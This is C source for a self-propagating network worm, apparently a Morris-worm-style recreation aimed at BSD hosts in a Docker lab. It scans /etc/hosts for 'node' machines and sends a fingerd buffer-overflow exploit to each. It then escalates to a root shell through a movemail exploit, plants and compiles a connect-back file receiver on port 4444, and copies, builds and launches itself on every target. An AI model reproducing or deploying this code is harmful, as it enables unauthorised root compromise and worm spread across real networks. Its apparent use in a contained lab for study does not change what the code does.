#include <stdio.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <netdb.h>
#include "worm_bsd.h"

#define HOSTS_FILE "/etc/hosts"
#define MAX_IP_LEN 64
#define DOCKER_IP_FILE "/etc/docker_ip"

void deploy_receive_file(sock)
    int sock;
{
    char cmd_buf[IO_BUF_SIZE];
    char *formatted_source;
    char *file_contents;
    char local_ip[64];
    FILE *fp;
    char line[128];
    
    printf("[*] Deploying receive_file.c to target\n");

    strcpy(local_ip, "127.0.0.1"); /* Default fallback */
    fp = fopen("/etc/docker_ip", "r");
    if (fp != (FILE *)0) {
        if (fgets(line, 128, fp) != (char *)0) {
            sscanf(line, "%s", local_ip);
        }
        fclose(fp);
    }
    /* printf("[DEBUG] Injected IP will be: [%s]\n", local_ip); */

    formatted_source = (char *)malloc(10000); 
    if (formatted_source == (char *)0) return;

    file_contents = "#include <stdio.h>\n#include <sys/types.h>\n\
#include <sys/socket.h>\n#include <netinet/in.h>\n#include <sys/time.h>\n\
#define SERVER_IP \"%s\"\n#define SERVER_PORT 4444\n#define IO_BUF_SIZE 2048\n\
int send_int(n,f) int n; int f; {unsigned long c=htonl((unsigned long)n);char *d=(char*)&c;\
int l=sizeof(c);int r;do{r=write(f,d,l);if(r<0)return -1;else{d+=r;l-=r;}}\
while(l>0);return 0;} int receive_int(n,f) int *n; int f; {unsigned long r;char *d=(char*)&r;\
int l=sizeof(r);int rc;do{rc=read(f,d,l);if(rc<=0)return -1;else{d+=rc;l-=rc;}}\
while(l>0);*n=ntohl(r);return 0;} int main(){int i,j,n,s,fs,len,nf;\
struct timeval tv;struct sockaddr_in sa;char b[2048],p[256];FILE *o;char *fn;\
s=socket(2,1,0);if(s<0)return 1;bzero((char*)&sa,sizeof(sa));sa.sin_family=2;\
sa.sin_port=htons(4444);sa.sin_addr.s_addr=inet_addr(SERVER_IP);\
while(connect(s,(struct sockaddr*)&sa,sizeof(sa))<0)sleep(1);\
while(1){write(s,\"Hello\\n\",6);if(receive_int(&nf,s)<0)break;\
for(i=0;i<nf;i++){receive_int(&len,s);fn=(char*)malloc(len+1);\
read(s,fn,len);fn[len]=0;sprintf(p,\"/tmp/%%s\",fn);o=fopen(p,\"w\");\
receive_int(&fs,s);while(fs>0){n=read(s,b,2047);if(n<=0)break;b[n]=0;\
fputs(b,o);fs-=n;}fclose(o);free(fn);send_int(i,s);}break;}close(s);return 0;}";

    /* strcpy(my_ip, "172.20.0.11"); */
    sprintf(formatted_source, file_contents, local_ip);

    write_to_sock(sock, "cat > /tmp/receive_file.c << 'EOF'\n");
    write_to_sock(sock, formatted_source);
    write_to_sock(sock, "\nEOF\n");
    sleep(5);

    bzero(cmd_buf, IO_BUF_SIZE);
    read_from_sock(sock, cmd_buf, IO_BUF_SIZE);
    free(formatted_source);
}

void infect(ip)
    char *ip;
{
    int sock;
    struct sockaddr_in serv_addr;
    char buf[BUF_SIZE];
    char io_buf[IO_BUF_SIZE];
    char *argv[5];

    bzero(buf, BUF_SIZE);
    bzero(io_buf, IO_BUF_SIZE);

    printf("[*] Starting infection for: %s\n", ip);
    fflush(stdout);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;

    create_sockaddr(&serv_addr, ip, FINGERD_PORT);

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        close(sock);
        printf("[*] SOCKET FAILED. EXITING\n");
        return;
    }

    create_exploit(buf, PAYLOAD, BUF_SIZE, PAYLOAD_LEN);
    write(sock, buf, BUF_SIZE);
    sleep(5);

    write_to_sock(sock, "echo bang\n");

    get_root_shell_via_movemail_exploit(sock, io_buf, IO_BUF_SIZE);
    printf("[*] Root shell obtained\n");

    deploy_receive_file(sock);
    
    printf("[*] Forking to create send_file process on server\n");

    if (fork() == 0) {
        argv[0] = "send_file_over_socket_bsd";
        argv[1] = "send_file_over_socket_bsd.c"; 
        argv[2] = "worm_bsd.c";
        argv[3] = "worm_bsd.h";
        argv[4] = (char *)0;
        execv("./send_file_over_socket_bsd", argv);
        exit(1);
    }

    printf("[*] Compiling receive_file.c on target\n");
    write_to_sock(sock, "cd /tmp; cc receive_file.c -o receive_file\n");
    sleep(2);
    read_from_sock(sock, io_buf, IO_BUF_SIZE);

    printf("[*] Running receive_file on target\n");
    write_to_sock(sock, "/tmp/receive_file &\n");
    sleep(12);
    read_from_sock(sock, io_buf, IO_BUF_SIZE);

    printf("[*] Checking /tmp contents on target\n");
    write_to_sock(sock, "ls -l /tmp\n");
    sleep(2);
    read_from_sock(sock, io_buf, IO_BUF_SIZE);

    printf("[*] Compiling send_file_over_socket_bsd.c on target\n");
    write_to_sock(sock, "cd /tmp; cc send_file_over_socket_bsd.c -o send_file_over_socket_bsd\n");
    sleep(2);

    printf("[*] Compiling worm_bsd.c on target\n");
    write_to_sock(sock, "cd /tmp; rm -f worm_bsd; cc worm_bsd.c -o worm_bsd\n");
    sleep(2);
    read_from_sock(sock, io_buf, IO_BUF_SIZE);
    
    printf("[*] Running worm_bsd on target\n");
    write_to_sock(sock, "/tmp/worm_bsd &\n");
    sleep(2);
    read_from_sock(sock, io_buf, IO_BUF_SIZE);

    close(sock);
}

int main()
{
    FILE *fp;
    char line[128];
    char ip_array[100][MAX_IP_LEN];  /* Array to store up to 100 IPs */
    char my_ip[MAX_IP_LEN];
    int num_targets = 0;
    int i;

    strcpy(my_ip, "127.0.0.1");
    fp = fopen("/etc/docker_ip", "r");
    if (fp != (FILE *)0) {
        if (fgets(line, 128, fp) != (char *)0) {
            sscanf(line, "%s", my_ip);
        }
        fclose(fp);
    }
    printf("[*] Attacker IP is %s. Scanning for targets.\n", my_ip);

    /* Parse /etc/hosts once and collect all node IPs */
    fp = fopen(HOSTS_FILE, "r");
    if (fp == (FILE *)0) {
        printf("[-] Could not open %s\n", HOSTS_FILE);
        return 1;
    }

    while (fgets(line, 128, fp) != (char *)0) {
        char current_hostname[64];
        char current_ip[MAX_IP_LEN];

        if (line[0] == '#' || line[0] == '\n' || line[0] == ' ' || line[0] == '\t') {
            continue;
        }

        if (sscanf(line, "%s %s", current_ip, current_hostname) != 2) {
            continue;
        }

        if (strcmp(current_ip, my_ip) == 0) {
            continue;
        }

        /* Check if the first 4 characters of the hostname are "node" */
        if (strncmp(current_hostname, "node", 4) == 0) {
            printf("[*] IP for %s found: %s\n", current_hostname, current_ip);
            
            /* Store IP in array */
            if (num_targets < 100) {
                strcpy(ip_array[num_targets], current_ip);
                num_targets++;
            }
        }
    }

    fclose(fp);

    printf("[*] Found %d target nodes. Starting infection sequence.\n", num_targets);

    /* Infect each target in the array */
    for (i = 0; i < num_targets; i++) {
        printf("\n[*] Infecting target %d of %d: %s\n", i + 1, num_targets, ip_array[i]);
        infect(ip_array[i]);
        printf(" ---- Infection Complete for IP: %s ----\n", ip_array[i]);
        sleep(10);
    }

    printf("[*] Infection sequence complete. All targets processed.\n");
    return 0;
}
